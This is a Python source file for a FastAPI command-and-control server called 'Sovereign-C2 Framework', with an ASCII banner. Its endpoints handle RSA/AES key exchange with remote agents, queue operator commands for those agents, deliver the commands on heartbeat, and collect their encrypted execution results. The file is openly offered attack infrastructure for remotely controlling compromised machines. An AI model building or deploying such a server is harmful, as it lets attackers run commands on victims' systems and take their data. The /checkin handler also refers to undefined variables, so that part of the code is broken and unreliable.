from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict
import logging
import base64
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
import uvicorn

def print_banner():
    banner = r"""
  _________                                   .__                         _________  ________             ___________                                                  __    
 /   _____/ _______  __  ____ _______   ____  |__| ____    ____           \_   ___ \ \_____  \            \_   _____/____________     _____   ______  _  _____________|  | __
 \_____  \ /  _ \  \/ /_/ __ \\_  __ \_/ __ \ |  |/ ___\  /    \   ______ /    \  \/  /  ____/    ______   |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /        (  <_> )   / \  ___/ |  | \/\  ___/ |  / /_/  >|   |  \ /_____/ \     \____/       \   /_____/   |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______  /\____/ \_/   \___  >|__|    \___  >|__\___  / |___|  /          \______  /\_______ \            \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                  \/             \/   /_____/       \/                  \/         \/                \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

           Sovereign-C2 Framework
    """
    print(banner)
    print("Sovereign-c2 - 4lph4-01 & Our Community\n")

app = FastAPI()
agents: Dict[str, Dict] = {}

# Configuring logging
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

class KeyExchangeRequest(BaseModel):
    AgentID: str
    EncAESKey: str

class HeartbeatRequest(BaseModel):
    AgentID: str

# Load RSA Public Key in XML Format
try:
    with open("public_key.xml", "r") as xml_file:
        PUBLIC_KEY_XML = xml_file.read()
except FileNotFoundError:
    logging.error("public_key.xml not found!")
    PUBLIC_KEY_XML = ""

@app.get("/public_key")
def get_public_key():
    """Send public key in XML format to agents."""
    if not PUBLIC_KEY_XML:
        raise HTTPException(status_code=500, detail="Public key not found")
    
    logging.info("Public key requested")
    return {"PublicKey": PUBLIC_KEY_XML}

def check_key_length(key: bytes) -> bytes:
    if len(key) not in [16, 24, 32]:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        raw_data = base64.b64decode(data)
        iv, ct = raw_data[:16], raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

def load_private_key():
    with open("private_key.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    return private_key

def decrypt_aes_key(enc_aes_key_base64, private_key):
    enc_aes_key = base64.b64decode(enc_aes_key_base64)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(enc_aes_key)
    return aes_key

private_key = load_private_key()

@app.post("/exchange_key")
def exchange_key(request: KeyExchangeRequest):
    """Handle the key exchange request from agents."""
    agent_id = request.AgentID
    enc_aes_key = request.EncAESKey
    try:
        aes_key = decrypt_aes_key(enc_aes_key, private_key)
        agents[agent_id] = {"aes_key": aes_key, "commands": []}
        logging.info(f"Key exchange successful for AgentID: {agent_id}")
        return {"Status": "Success"}
    except Exception as e:
        logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Key exchange failed")

@app.post("/heartbeat")
def heartbeat(request: HeartbeatRequest):
    """Handle heartbeat from agents to keep the connection alive."""
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    aes_key = agents[agent_id]["aes_key"]
    # Check for pending commands
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, aes_key)
    else:
        response = encrypt_data("NoCommand", aes_key)
    
    logging.info(f"Heartbeat received from AgentID: {agent_id}")
    return {"data": response}

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")

    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, key)
    else:
        response = encrypt_data("NoCommand", key)

    return {"key": key_b64, "data": response}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    try:
        decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
        logging.info(message)
        print(message, flush=True)  # Print to console for real-time monitoring
    except Exception as e:
        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

    return {"Status": "OK"}

@app.get("/list_agents")
def list_agents():
    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

def run_server():
    print_banner()
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    run_server()
